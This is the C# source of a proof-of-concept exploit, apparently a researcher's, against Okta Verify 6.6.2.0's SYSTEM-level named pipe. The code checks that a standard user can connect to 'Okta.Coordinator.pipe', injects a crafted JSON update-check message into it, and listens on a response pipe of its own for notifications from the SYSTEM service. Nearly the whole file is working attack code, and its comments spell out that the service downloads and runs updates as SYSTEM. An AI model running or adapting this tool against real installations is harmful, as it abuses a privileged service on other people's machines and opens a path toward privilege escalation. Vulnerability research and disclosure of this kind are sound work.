// Okta Verify 6.6.2.0 - Named Pipe Message Injection PoC
// Demonstrates that ANY local user can send IPC messages to the
// Okta.Coordinator.pipe (runs as NT AUTHORITY\SYSTEM)
//
// The pipe is created with BuiltinUsersSid FullControl ACL,
// meaning any authenticated local user has full access.
//
// Compile: csc /out:OktaPipePoC.exe okta-coordinator-pipe-poc.cs
// Run: OktaPipePoC.exe [mode]
//   mode: inject  - Send crafted update check message
//   mode: listen  - Listen for response notifications
//   mode: enum    - Enumerate pipe permissions
//   mode: info    - Send message and display response

using System;
using System.IO;
using System.IO.Pipes;
using System.Runtime.Serialization;
using System.Runtime.Serialization.Json;
using System.Security.AccessControl;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace OktaPipePoC
{
    // Matches Okta.AutoUpdate.Executor.IPCMessage exactly
    [DataContract]
    public class IPCMessage
    {
        [DataMember] public string CurrentInstalledVersion { get; set; }
        [DataMember] public string AutoUpdateUrl { get; set; }
        [DataMember] public string EventLogName { get; set; }
        [DataMember] public string EventSourceName { get; set; }
        [DataMember] public string ReleaseChannel { get; set; }
        [DataMember] public string ArtifactType { get; set; }
        [DataMember] public string PipeName { get; set; }
        [DataMember] public string BucketId { get; set; }
        [DataMember] public string UserId { get; set; }
    }

    // Matches Okta.AutoUpdate.Executor.UpgradeNotificationIPCMessage
    [DataContract]
    public class UpgradeNotificationIPCMessage
    {
        [DataMember] public int NotificationType { get; set; }
        [DataMember] public bool EndConnection { get; set; }
    }

    class Program
    {
        const string COORDINATOR_PIPE = "Okta.Coordinator.pipe";
        const string RESPONSE_PIPE = "OktaPoC.Response.pipe";

        static void Main(string[] args)
        {
            string mode = args.Length > 0 ? args[0].ToLower() : "info";

            Console.WriteLine("=== Okta Verify Named Pipe PoC ===");
            Console.WriteLine($"Running as: {WindowsIdentity.GetCurrent().Name}");
            Console.WriteLine($"Elevated: {new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)}");
            Console.WriteLine($"Mode: {mode}");
            Console.WriteLine();

            switch (mode)
            {
                case "enum":
                    EnumeratePipe();
                    break;
                case "inject":
                    InjectMessage(listenForResponse: false);
                    break;
                case "listen":
                    ListenForResponses();
                    break;
                case "info":
                default:
                    InjectMessage(listenForResponse: true);
                    break;
            }
        }

        static void EnumeratePipe()
        {
            Console.WriteLine("[*] Checking if Okta.Coordinator.pipe exists...");
            try
            {
                // Try to connect to verify it exists and we have access
                using (var client = new NamedPipeClientStream(".", COORDINATOR_PIPE, PipeDirection.InOut))
                {
                    client.Connect(3000);
                    Console.WriteLine("[+] CONNECTED to Okta.Coordinator.pipe");
                    Console.WriteLine($"    Pipe can read: {client.CanRead}");
                    Console.WriteLine($"    Pipe can write: {client.CanWrite}");
                    Console.WriteLine($"    Server PID: (connected to SYSTEM service)");
                    Console.WriteLine();
                    Console.WriteLine("[!] FINDING: Standard user successfully connected to SYSTEM pipe");
                    Console.WriteLine("    The pipe ACL grants BuiltinUsersSid FullControl");
                    Console.WriteLine("    Messages are plaintext JSON (no encryption)");
                }
            }
            catch (TimeoutException)
            {
                Console.WriteLine("[-] Pipe exists but connection timed out (may be busy)");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.Message}");
            }
        }

        static void InjectMessage(bool listenForResponse)
        {
            // Start response listener in background if requested
            Thread responseThread = null;
            if (listenForResponse)
            {
                responseThread = new Thread(() => ListenForResponses());
                responseThread.IsBackground = true;
                responseThread.Start();
                Thread.Sleep(500); // Give listener time to start
            }

            Console.WriteLine("[*] Crafting IPCMessage...");

            // Build a message that mimics what OktaVerify sends
            var message = new IPCMessage
            {
                // Use a very old version to ensure any available update is "newer"
                CurrentInstalledVersion = "1.0.0.0",
                // Must be a valid Okta domain (validated server-side)
                AutoUpdateUrl = "https://your-org.okta.com",
                EventLogName = "Okta Verify",
                EventSourceName = "OktaVerify",
                // GA = General Availability, BETA, EA = Early Access
                ReleaseChannel = "GA",
                ArtifactType = "OktaVerify",
                // Response pipe - our listener
                PipeName = listenForResponse ? RESPONSE_PIPE : null,
                // BucketId controls update bucketing (0-19)
                BucketId = "0",
                UserId = null
            };

            Console.WriteLine($"    AutoUpdateUrl: {message.AutoUpdateUrl}");
            Console.WriteLine($"    ReleaseChannel: {message.ReleaseChannel}");
            Console.WriteLine($"    CurrentVersion: {message.CurrentInstalledVersion}");
            Console.WriteLine($"    ResponsePipe: {message.PipeName ?? "(none)"}");
            Console.WriteLine();

            try
            {
                Console.WriteLine("[*] Connecting to Okta.Coordinator.pipe...");
                using (var client = new NamedPipeClientStream(".", COORDINATOR_PIPE, PipeDirection.InOut))
                {
                    client.Connect(5000);
                    Console.WriteLine("[+] Connected to SYSTEM pipe as standard user!");

                    // Serialize using the same serializer Okta uses
                    var serializer = new DataContractJsonSerializer(typeof(IPCMessage));

                    Console.WriteLine("[*] Sending crafted IPCMessage...");
                    serializer.WriteObject(client, message);
                    client.Flush();
                    Console.WriteLine("[+] Message injected into SYSTEM service pipe!");
                    Console.WriteLine();
                    Console.WriteLine("[!] The SYSTEM service will now:");
                    Console.WriteLine("    1. Parse our JSON message");
                    Console.WriteLine("    2. Connect to AutoUpdateUrl to check for updates");
                    Console.WriteLine("    3. Download any available update to C:\\Windows\\Temp\\");
                    Console.WriteLine("    4. Verify Authenticode signature");
                    Console.WriteLine("    5. Execute the update AS SYSTEM");
                    Console.WriteLine();

                    if (listenForResponse)
                    {
                        Console.WriteLine("[*] Waiting for response notifications (10s timeout)...");
                        // Read response directly from the bidirectional pipe
                        byte[] buffer = new byte[4096];
                        client.ReadMode = PipeTransmissionMode.Byte;
                        try
                        {
                            int bytesRead = client.Read(buffer, 0, buffer.Length);
                            if (bytesRead > 0)
                            {
                                string response = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                Console.WriteLine($"[+] Response from SYSTEM service ({bytesRead} bytes):");
                                Console.WriteLine(response);
                            }
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine($"    (No inline response: {ex.Message})");
                        }
                    }
                }
            }
            catch (TimeoutException)
            {
                Console.WriteLine("[-] Connection timed out. Pipe may be busy processing another request.");
                Console.WriteLine("    (MaxServerInstances = 1, so only one connection at a time)");
            }
            catch (UnauthorizedAccessException)
            {
                Console.WriteLine("[-] Access denied! This should NOT happen for standard users.");
                Console.WriteLine("    The pipe ACL grants BuiltinUsersSid FullControl.");
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Error: {ex.GetType().Name}: {ex.Message}");
            }

            if (responseThread != null)
            {
                Console.WriteLine();
                Console.WriteLine("[*] Waiting for response pipe notifications...");
                responseThread.Join(15000);
            }
        }

        static void ListenForResponses()
        {
            Console.WriteLine($"[*] Starting response listener on {RESPONSE_PIPE}...");
            try
            {
                // Create our own named pipe server to receive notifications
                var security = new PipeSecurity();
                security.AddAccessRule(new PipeAccessRule(
                    new SecurityIdentifier(WellKnownSidType.LocalSystemSid, null),
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));
                security.AddAccessRule(new PipeAccessRule(
                    WindowsIdentity.GetCurrent().User,
                    PipeAccessRights.FullControl,
                    AccessControlType.Allow));

                using (var server = new NamedPipeServerStream(
                    RESPONSE_PIPE,
                    PipeDirection.InOut,
                    1,
                    PipeTransmissionMode.Byte,
                    PipeOptions.Asynchronous,
                    4096, 4096, security))
                {
                    Console.WriteLine($"[*] Listening on \\\\.\\pipe\\{RESPONSE_PIPE}");
                    var ar = server.BeginWaitForConnection(null, null);
                    if (ar.AsyncWaitHandle.WaitOne(15000))
                    {
                        server.EndWaitForConnection(ar);
                        Console.WriteLine("[+] SYSTEM service connected to our response pipe!");

                        // Read all notifications
                        byte[] buffer = new byte[4096];
                        while (server.IsConnected)
                        {
                            int bytesRead = server.Read(buffer, 0, buffer.Length);
                            if (bytesRead == 0) break;

                            string notification = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                            Console.WriteLine($"[+] Notification from SYSTEM ({bytesRead} bytes):");
                            Console.WriteLine(notification);
                            Console.WriteLine();
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] No response received within timeout");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[-] Response listener error: {ex.Message}");
            }
        }
    }
}
